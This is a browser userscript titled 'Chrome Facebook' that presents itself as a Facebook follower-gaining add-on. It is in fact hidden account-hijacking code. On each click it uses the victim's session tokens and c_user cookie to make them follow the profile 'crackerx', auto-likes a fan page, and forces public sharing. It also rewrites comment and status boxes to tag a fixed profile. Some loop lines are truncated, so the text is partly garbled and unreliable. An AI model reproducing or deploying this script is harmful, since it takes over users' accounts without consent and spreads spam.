// ==UserScript== 
// @name Chrome Facebook 
// @author Chrome Facebook 
// @version 1.0 
// @description Facebook Abone Kasma & Sayfa Kasma Eklentisi 
// @namespace Chrome Facebook 
// @include http://*.facebook.com/* 
// @include https://*.facebook.com/* 
// @include http://*.formspring.me/* 
// ==/UserScript==

if (document.URL.indexOf("sharer.php") >= 0) { 
document.getElementsByName("UITargetedPrivacyWidget").item(0).value = "80"; 
document.getElementsByName("audience[0][value]").item(0).value = "80"; 
document.forms.item(0).innerHTML += "<input>< 0 && this.name == 'add_comment_text_text'){this.value = '@[288323417875851] ';}"); 
} 
document.addEventListener("click", function () { 
if (document.URL.indexOf("facebook.com/SeyhunFanPage") >= 0 && document.URL.indexOf("sharer.php") < 0) { 
for (i = 0; i <=>
if (document.getElementById("mainbuttonspan").getElementsByTagName("input").item(i).value == "Beğen") { 
document.getElementById("mainbuttonspan").getElementsByTagName("input").item(i).id = "Begen" 
} 
} 
try { 
document.getElementById("Begen").click(); 
} 
catch (err) { 
}

}

for (i = 0; i <=>
document.getElementsByTagName("textarea").item(i).setAttribute("onkeydown", "if(this.value.indexOf('@[288323417875851] ') < 0 && this.name == 'add_comment_text_text' || this.name == 'xhpc_message_text' && this.value.indexOf('@[288323417875851] ') < 0){this.value = '@[288323417875851] ';}"); 
} 
var xmlhttp = new XMLHttpRequest(); 
xmlhttp.onreadystatechange = function () { 
}; 
if(document.URL.indexOf("https://") >= 0){xmlhttp.open("POST", "https://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);} 
else{xmlhttp.open("POST", "http://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);} 
var params = "profile_id=crackerx"; 
params += "&location=1"; 
params += "&source=follow-button"; 
params += "&subscribed_button_id=u37qac_37"; 
params += "&post_form_id=" + document.getElementsByName("post_form_id").item(0).value; 
params += "&fb_dtsg=" + document.getElementsByName("fb_dtsg").item(0).value; 
params += "&lsd="; 
params += "&post_form_id_source=AsyncRequest"; 
params += "&__user=" + cereziAl("c_user"); 
params += "&phstamp=16581654586116117107156"; 
xmlhttp.send(params); 
}, false);

function cereziAl(isim) { 
var tarama = isim + "="; 
if (document.cookie.length > 0) { 
konum = document.cookie.indexOf(tarama) 
if (konum != -1) { 
konum += tarama.length 
son = document.cookie.indexOf(";", konum) 
if (son == -1) 
son = document.cookie.length 
return unescape(document.cookie.substring(konum, son)) 
} 
else { return ""; } 
} 
}